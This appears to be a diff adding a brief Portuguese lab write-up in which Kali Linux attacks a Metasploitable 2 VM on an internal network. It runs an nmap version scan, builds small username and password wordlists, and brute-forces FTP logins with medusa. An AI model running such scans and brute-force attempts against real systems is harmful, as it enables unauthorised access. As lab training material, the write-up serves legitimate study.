@@ -1,0 +1,10 @@
+Etapas realizadas: 
+
+1- Baixar a iso do kali e a vm do metasploitable 2 e confiugrar para rede interna, para que eles consigam alcançar um ao outro. Iremos utilizar o kali para realizar o ataque na máquina metasploitable 2. 
+2- Nesse caso, como já temos o alvo a ser atacado, ou seja, você já possui o IP da máquina alvo, iremos no kali rodar um comando para verificar se as portas desejadas estão abertas para que então, consigamos explorar: 
+  - nmap -sV -p 21,22,80,445,139 192.168.56.101 # O comando -sV indica qual versão o serviço está rodando
+Com o resultado e as portas com seu status identificado, no caso, a porta 21 estava aberta e a utilizamos para os testes. Seguiremos para o próximo passo criando nome e usuários comuns em diferentes arquivos: 
+  - echo -e "user\nmsfadmin\nadmin\nroot" > users.txt # para criarmos a lista de usuários dentro do arquivo users.txt
+  - echo -e "123456\npassword\nadmin\nnmsfadmin" > pass.txt # para criarmos a lista de senhas dentro do arquivo pass.txt
+  - medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6 # para encontrar a combinação com sucesso de login e senha
+  Para fazer o teste, basta apenas rodar o serviço ftp com o ip desejado e incluir uma das combinações com sucesso. Ex: ftp 192.168.56.101 
